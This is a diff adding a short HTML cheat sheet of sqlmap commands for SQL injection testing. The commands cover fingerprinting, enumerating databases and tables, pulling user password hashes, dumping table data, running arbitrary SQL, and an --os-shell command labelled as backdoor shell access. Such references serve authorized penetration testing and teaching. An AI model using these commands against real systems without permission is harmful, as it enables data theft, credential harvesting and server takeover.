@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>sqlmap</title>
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+</head>
+<body>
+<h1 id="test-url-and-post-data-and-return-database-banner-if-possible">Test URL and POST data and return database banner (if possible)</h1>
+<p>./sqlmap.py –url=“<url>” –data=“<post-data>” –banner</p>
+<h1 id="parse-request-data-and-test-request-data-can-be-obtained-with-burp">Parse request data and test | request data can be obtained with burp</h1>
+<p>./sqlmap.py -r <request-file> <options></p>
+<h1 id="fingerprint-much-more-information-than-banner">Fingerprint | much more information than banner</h1>
+<p>./sqlmap.py -r <request-file> –fingerprint</p>
+<h1 id="get-database-username-name-and-hostname">Get database username, name, and hostname</h1>
+<p>./sqlmap.py -r <request-file> –current-user –current-db –hostname</p>
+<h1 id="check-if-user-is-a-database-admin">Check if user is a database admin</h1>
+<p>./sqlmap.py -r <request-file> –is-dba</p>
+<h1 id="get-database-users-and-password-hashes">Get database users and password hashes</h1>
+<p>./sqlmap.py -r <request-file> –users –passwords</p>
+<h1 id="enumerate-databases">Enumerate databases</h1>
+<p>./sqlmap.py -r <request-file> –dbs</p>
+<h1 id="list-tables-for-one-database">List tables for one database</h1>
+<p>./sqlmap.py -r <request-file> -D <db-name> –tables</p>
+<h1 id="other-database-commands">Other database commands</h1>
+<p>./sqlmap.py -r <request-file> -D <db-name> –columns –schema –count</p>
+<h1 id="enumeration-flags">Enumeration flags</h1>
+<p>./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> -U <user-name></p>
+<h1 id="extract-data">Extract data</h1>
+<p>./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> –dump</p>
+<h1 id="execute-sql-query">Execute SQL Query</h1>
+<p>./sqlmap.py -r <request-file> –sql-query=“<sql-query>”</p>
+<h1 id="appendprepend-sql-queries">Append/Prepend SQL Queries</h1>
+<p>./sqlmap.py -r <request-file> –prefix=“<sql-query>” –suffix=“<sql-query>”</p>
+<h1 id="get-backdoor-access-to-sql-server-can-give-shell-access">Get backdoor access to sql server | can give shell access</h1>
+<p>./sqlmap.py -r <request-file> –os-shell</p>
+</body>
+</html>
